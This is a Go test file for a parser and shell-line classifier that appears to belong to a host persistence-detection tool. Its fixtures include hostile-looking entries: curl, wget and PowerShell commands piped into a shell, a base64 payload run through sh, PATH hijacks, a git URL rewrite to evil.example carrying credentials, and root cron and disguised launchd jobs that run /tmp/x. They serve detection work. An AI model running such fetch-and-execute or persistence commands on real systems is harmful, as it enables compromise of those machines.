package parse

import (
	"strings"
	"testing"

	"github.com/ucsurf/aftermath/internal/model"
)

func TestAuthorizedKeyFingerprint(t *testing.T) {
	line := "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDdvylCEJ/k2TpezcTfedrkHyFSK9IZ3vmP6vhY4Ss0P svc-telemetry"
	keys, trunc := ParseAuthorizedKeys(line + "\n")
	if trunc || len(keys) != 1 {
		t.Fatalf("keys=%d trunc=%v", len(keys), trunc)
	}
	k := keys[0]
	if k.Fingerprint != "SHA256:0Z6R+DF64Do2nwQic8a7kkfDLNNk4IiK+2U2Rci4htk" {
		t.Fatalf("fingerprint %s", k.Fingerprint)
	}
	if k.Comment != "svc-telemetry" || k.Type != "ssh-ed25519" {
		t.Fatalf("%+v", k)
	}
}

func TestAuthorizedKeyOptions(t *testing.T) {
	line := `command="echo hi there",restrict ssh-ed25519 AAAA laptop one`
	keys, _ := ParseAuthorizedKeys(line)
	if len(keys) != 1 {
		t.Fatal(len(keys))
	}
	if !HasOptionPrefix(keys[0].Options, "command=") || !HasOption(keys[0].Options, "restrict") {
		t.Fatalf("options %#v", keys[0].Options)
	}
	if keys[0].Comment != "laptop one" {
		t.Fatalf("comment %q", keys[0].Comment)
	}
}

func TestShellClassifier(t *testing.T) {
	cases := []struct {
		line string
		want model.Severity
		hit  bool
	}{
		{`export PATH="$HOME/.local/bin:$PATH"`, "", false},
		{`eval "$(starship init bash)"`, "", false},
		{`eval "$(ssh-agent -s)"`, "", false},
		{`echo "curl https://example.com | sh"`, "", false},
		{`curl -fsSL https://example.invalid/setup.sh | bash`, model.High, true},
		{`wget -qO- https://example.invalid/x | sh`, model.High, true},
		{`echo YQ== | base64 -d | sh`, model.High, true},
		{`eval "$(curl -fsSL https://example.invalid/x)"`, model.High, true},
		{`echo $(curl http://example.invalid/x | sh)`, model.High, true},
		{`export PATH="/tmp/bin:$PATH"`, model.High, true},
		{`export PATH="$HOME/weird:$PATH"`, model.Medium, true},
		{`export PATH="./bin:$PATH"`, model.Medium, true},
		{`curl -fsSL https://example.invalid/x -o out.sh`, "", false},
		{`iwr https://example.invalid/a | iex`, model.High, true},
	}
	for _, tc := range cases {
		hits, _ := ScanShell(tc.line+"\n", "/home/dev")
		if tc.hit && len(hits) != 1 {
			t.Errorf("%q: got %#v, want a hit", tc.line, hits)
			continue
		}
		if !tc.hit && len(hits) != 0 {
			t.Errorf("%q: unexpected %#v", tc.line, hits)
			continue
		}
		if tc.hit && hits[0].Severity != tc.want {
			t.Errorf("%q: severity %s want %s (%s)", tc.line, hits[0].Severity, tc.want, hits[0].Reason)
		}
	}
}

func TestGitConfig(t *testing.T) {
	src := `
# comment
[core]
	hooksPath = /tmp/hooks
	fsmonitor = true
[url "git@github.com:"]
	insteadOf = https://github.com/
[url "https://user:secret@evil.example/"]
	insteadOf = https://github.com/
[include]
	path = ~/.config/git/extra
`
	entries, _ := ParseGitConfig(src)
	if len(entries) != 5 {
		t.Fatalf("entries %d: %#v", len(entries), entries)
	}
	if entries[0].Key != "hookspath" || entries[0].Value != "/tmp/hooks" {
		t.Fatalf("%+v", entries[0])
	}
	if entries[2].Section != "url" || entries[2].Sub != "git@github.com:" {
		t.Fatalf("%+v", entries[2])
	}
}

func TestCrontab(t *testing.T) {
	src := "MAILTO=a@b.c\n@reboot root /bin/sh /tmp/x\n*/5 * * * * root /usr/bin/true\n"
	entries, _ := ParseCrontab(src, true)
	if len(entries) != 2 {
		t.Fatalf("%#v", entries)
	}
	if entries[0].User != "root" || !strings.Contains(entries[0].Command, "/tmp/x") {
		t.Fatalf("%+v", entries[0])
	}
	user, _ := ParseCrontab("@daily /usr/bin/true\n", false)
	if len(user) != 1 || user[0].Command != "/usr/bin/true" {
		t.Fatalf("%#v", user)
	}
}

func TestPlistAndTask(t *testing.T) {
	plist := `<?xml version="1.0"?>
<plist><dict>
<key>Label</key><string>com.apple.sysmond</string>
<key>ProgramArguments</key><array><string>/bin/sh</string><string>/tmp/x</string></array>
</dict></plist>`
	info, err := ParseLaunchPlist([]byte(plist))
	if err != nil || info.Label != "com.apple.sysmond" || len(info.Program) != 2 {
		t.Fatalf("%v %+v", err, info)
	}
	if info, err := ParseLaunchPlist([]byte("bplist00")); err != nil || !info.Binary {
		t.Fatalf("binary %+v %v", info, err)
	}
	xml := `<?xml version="1.0"?><Task><RegistrationInfo><URI>\SysMon</URI></RegistrationInfo><Actions><Exec><Command>cmd.exe</Command><Arguments>/c echo fixture</Arguments></Exec></Actions></Task>`
	task, err := ParseTaskXML([]byte(xml))
	if err != nil || task.URI != `\SysMon` || len(task.Commands) != 1 || !strings.Contains(task.Commands[0], "echo fixture") {
		t.Fatalf("%v %+v", err, task)
	}
	// UTF-16 LE BOM
	raw := []byte{0xFF, 0xFE}
	u := utf16LE(xml)
	task, err = ParseTaskXML(append(raw, u...))
	if err != nil || !strings.Contains(strings.Join(task.Commands, " "), "cmd.exe") {
		t.Fatalf("utf16 %v %+v", err, task)
	}
}

func utf16LE(s string) []byte {
	out := make([]byte, len(s)*2)
	for i := 0; i < len(s); i++ {
		out[i*2] = s[i]
	}
	return out
}

func TestJSONC(t *testing.T) {
	in := `{
  // comment
  "a": 1,
  "b": "http://not-a-comment",
}`
	got := StripJSONC(in)
	if strings.Contains(got, "// comment") || strings.Contains(got, ",\n}") || strings.Contains(got, ",}") {
		t.Fatalf("%q", got)
	}
	if !strings.Contains(got, "http://not-a-comment") {
		t.Fatalf("stripped string %q", got)
	}
}

func TestDesktop(t *testing.T) {
	s := "[Desktop Entry]\nName=Demo\nExec=/bin/true\nHidden=true\n"
	d := ParseDesktop(s)
	if d.Name != "Demo" || !d.Hidden || d.Exec != "/bin/true" {
		t.Fatalf("%+v", d)
	}
}
